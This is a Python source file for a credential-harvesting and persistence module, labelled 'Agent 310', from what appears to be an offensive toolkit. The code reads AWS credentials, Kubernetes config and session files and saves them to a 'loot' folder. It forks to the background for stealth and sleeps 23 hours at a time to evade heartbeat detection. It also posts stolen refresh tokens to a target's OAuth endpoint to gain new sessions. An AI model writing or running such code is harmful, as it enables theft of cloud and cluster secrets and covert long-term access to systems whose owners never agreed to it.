#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import time
import json
import requests
from datetime import datetime

class TokenRefresher:
    """
    Agent 310: Persistent Identity Maintainer.
    Monitors for session tokens and utilizes refresh-token 
    logic to maintain long-term access without re-exploitation.
    """
    def __init__(self, refresh_url=None):
        self.loot_dir = "/home/dan/Chimera_Project/agents/310_Token_Refresher/loot"
        self.token_file = "/tmp/.sys-auth-cache"
        self.refresh_url = refresh_url
        os.makedirs(self.loot_dir, exist_ok=True)

    def _get_cached_tokens(self):
        """Looks for tokens left in temp files or env vars."""
        tokens = {}
        # Common places apps cache tokens
        paths = [
            os.path.expanduser("~/.aws/credentials"),
            os.path.expanduser("~/.kube/config"),
            "/tmp/session_data.json"
        ]
        for p in paths:
            if os.path.exists(p):
                with open(p, 'r') as f:
                    tokens[os.path.basename(p)] = f.read()
        return tokens

    def refresh_logic(self, client_id, refresh_token):
        """Simulates an OAuth2 refresh request to get a new Access Token."""
        if not self.refresh_url:
            return
        
        print(f"[*] Attempting token refresh via {self.refresh_url}...")
        payload = {
            'grant_type': 'refresh_token',
            'refresh_token': refresh_token,
            'client_id': client_id
        }
        try:
            r = requests.post(self.refresh_url, data=payload, timeout=5)
            if r.status_code == 200:
                new_creds = r.json()
                print("[!!!] REFRESH SUCCESSFUL. New Session Acquired.")
                return new_creds
        except Exception as e:
            print(f"[!] Refresh failed: {e}")
        return None

    def execute(self):
        print("--- [AGENT 310: TOKEN REFRESHER ENGAGED] ---")
        
        # Fork to background for stealth persistence
        if os.fork() > 0: sys.exit(0)
        
        while True:
            tokens = self._get_cached_tokens()
            if tokens:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                with open(f"{self.loot_dir}/tokens_{timestamp}.json", 'w') as f:
                    json.dump(tokens, f)
                print(f"[*] Tokens harvested at {timestamp}")

            # Sleep for 23 hours (Low-and-Slow stealth)
            # This avoids the "Heartbeat" detection of 60-second intervals
            time.sleep(82800) 

if __name__ == "__main__":
    # Example: ./main.py 'https://auth.target.com/token'
    url = sys.argv[1] if len(sys.argv) > 1 else None
    TokenRefresher(url).execute()
